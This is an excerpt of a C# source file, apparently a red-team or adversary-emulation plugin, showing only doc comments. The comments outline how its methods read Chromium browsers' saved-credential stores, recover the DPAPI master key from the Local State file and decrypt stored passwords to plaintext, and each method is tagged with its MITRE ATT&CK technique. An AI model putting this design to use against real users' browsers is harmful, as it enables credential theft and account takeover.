...
namespace Plugin.Browsers.Chromium
{
    public class Chromium
    {
        ...
        * Chromium.Accounts()
        *     About: 
        *          Uses SQLiteHandler to read in the credential store for Chromium based browsers and acquire keys / decrypt them
        *      Returns:
        *          Plaintext credentials that can be recovered
        ...
        */
        ...
        /*
        * Chromium.DecryptWithKey()
        *     About: 
        *          Uses DPAPI master key to decrypt browser passwords
        *      Returns:
        ...
        *     About: 
        *          Looks for DPAPI master key in Local State file within browser directories specific to Chromium browser and unprotects data with it
        *      Returns:
        *          Unprotected data in scope for current user (credential material) 
        *      MITRE ATT&CK Techniques:
        *          T1555.004 Windows Credential Manager
        *  
        */
        ...
        * Chromium.Decrypt()
        *     About: 
        *          Uses DPAPI unprotect to decrypt data from browser stores
        *      Returns:
        *          unencrypted credential material 
        *      MITRE ATT&CK Techniques:
        *          T1555.004 Windows Credential Manager
        *  
        */
